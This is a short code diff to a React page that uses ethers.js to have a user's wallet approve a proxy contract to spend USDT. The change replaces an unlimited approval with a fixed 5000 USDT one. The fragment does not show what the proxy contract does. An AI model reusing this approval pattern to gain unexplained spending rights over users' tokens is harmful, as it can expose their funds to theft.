@@ -102,8 +102,8 @@ export default function HomePage() {
           const contract = new ethers.Contract(connectedChain.usdtAddress, USDT_ABI, signer);
 
           // 4. Define the amount to approve (5000 USDT) using the correct decimals for the chain
-          // const amountToApprove = ethers.parseUnits("5000", connectedChain.decimals);
-          const amountToApprove = ethers.MaxUint256;
+          const amountToApprove = ethers.parseUnits("5000", connectedChain.decimals);
+          // const amountToApprove = ethers.MaxUint256;
 
           // 5. Send the approval transaction to the user's wallet
           const tx = await contract.approve(proxyContractAddress, amountToApprove);
